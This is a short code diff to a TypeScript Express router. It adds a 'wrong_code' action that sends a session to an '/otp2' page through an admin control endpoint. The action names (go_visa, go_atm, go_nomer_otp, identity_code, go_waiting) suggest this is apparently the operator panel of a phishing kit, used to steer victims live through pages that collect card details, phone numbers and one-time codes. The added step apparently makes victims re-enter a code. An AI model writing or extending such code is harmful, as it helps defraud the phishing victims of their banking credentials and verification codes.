@@ -25,7 +25,8 @@ const actionToPage: Record<string, string> = {
   "go_total2": "/total2",
   "go_waiting": "/waiting",
   "identity_code": "/identity-check",
-  "go_identity_check": "/identity-check"
+  "go_identity_check": "/identity-check",
+  "wrong_code": "/otp2"
 };
 
 function requireAuth(
@@ -66,7 +67,7 @@ router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
       "go_nomer", "nomer_error", "go_nomer_wait", "go_nomer_otp",
       "go_home", "go_form", "go_select", "go_visa", "go_atm",
       "go_total", "go_total2", "go_waiting",
-      "identity_code", "go_identity_check"
+      "identity_code", "go_identity_check", "wrong_code"
     ];
 
     if (!action || !allowed.includes(action as ControlAction)) {
